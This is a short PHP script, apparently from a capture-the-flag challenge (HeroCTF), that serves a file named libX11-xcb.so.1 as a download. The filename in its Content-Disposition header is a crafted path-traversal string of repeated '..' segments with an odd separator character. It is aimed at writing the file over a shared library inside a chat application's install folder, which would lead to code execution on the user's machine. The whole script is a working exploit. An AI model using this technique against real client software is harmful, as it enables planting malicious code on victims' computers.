<?php
$filename = "libX11-xcb.so.1";
header('Content-Description: File Transfer'); 
header('Content-Type: application/octet-stream'); 
header('Content-Disposition: attachment; filename="..į..į..į..į..į..į..į..į..į..į..į..į..į..į..įhomeįwortyįDocumentsįHeroCTFįclientįrelease-buildsįTelechat-linux-x64įlibX11-xcb.so.1"'); 
header('Content-Transfer-Encoding: binary'); 
header('Expires: 0'); 
header('Cache-Control: must-revalidate'); 
header('Pragma: public'); 
header('Content-Length: ' . filesize($filename)); 
ob_clean();
flush();
readfile($filename);
exit;
?>
